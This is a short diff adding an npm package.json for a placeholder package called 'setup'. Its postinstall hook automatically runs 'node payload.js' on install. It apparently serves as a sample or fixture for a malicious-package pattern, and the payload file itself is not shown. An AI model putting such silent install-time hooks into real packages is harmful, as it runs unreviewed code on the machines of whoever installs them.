@@ -1,0 +1,8 @@
+{
+  "name": "setup",
+  "version": "1.0.0",
+  "description": "a setup",
+  "scripts": {
+    "postinstall": "node payload.js a"
+  }
+}
